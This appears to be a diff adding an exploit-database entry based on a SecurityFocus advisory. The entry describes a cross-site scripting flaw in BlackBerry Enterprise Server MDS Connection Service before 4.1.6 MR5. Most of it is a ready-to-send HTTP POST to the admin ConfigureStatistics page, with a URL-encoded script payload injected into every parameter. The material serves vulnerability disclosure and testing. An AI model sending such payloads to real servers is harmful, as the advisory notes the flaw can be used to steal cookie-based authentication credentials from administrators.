@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/34573/info
+
+BlackBerry Enterprise Server MDS Connection Service is prone to a cross-site scripting vulnerability because it fails to adequately sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site and to steal cookie-based authentication credentials.
+
+Versions prior to BlackBerry Enterprise Server 4.1.6 MR5 are vulnerable.
+
+POST /admin/statistics/ConfigureStatistics HTTP/1.0
+Cookie: JSESSIONID=....
+Content-Length: 753
+Accept: */*
+Accept-Language: en-US
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Referer: http://www.example.com:8080/admin/statistics/ConfigureStatistics
+
+customDate=%3E%22%27%3E%3Cscript%3Ealert%28782%29%3C%2Fscript%3E&
+interval=%3E%22%27%3E%3Cscript%3Ealert%28782%29%3C%2Fscript%3E&
+lastCustomInterval=%3E%22%27%3E%3Cscript%3Ealert%28782%29%3C%2Fscript%3E
+&lastIntervalLength=%3E%22%27%3E%3Cscript%3Ealert%28782%29%3C%2Fscript%
+3E&nextCustomInterval=%3E%22%27%3E%3Cscript%3Ealert%28782%29%3C%2Fscript
+%3E&nextIntervalLength=%3E%22%27%3E%3Cscript%3Ealert%28782%29%3C%
+2Fscript%3E&action=%3E%22%27%3E%3Cscript%3Ealert%28782%29%3C%2Fscript%3E
+&delIntervalIndex=%3E%22%27%3E%3Cscript%3Ealert%28782%29%3C%2Fscript%3E&
+addStatIndex=%3E%22%27%3E%3Cscript%3Ealert%28782%29%3C%2Fscript%3E&
+delStatIndex=%3E%22%27%3E%3Cscript%3Ealert%28782%29%3C%2Fscript%3E&
+referenceTime=%3E%22%27%3E%3Cscript%3Ealert%28782%29%3C%2Fscript%3E
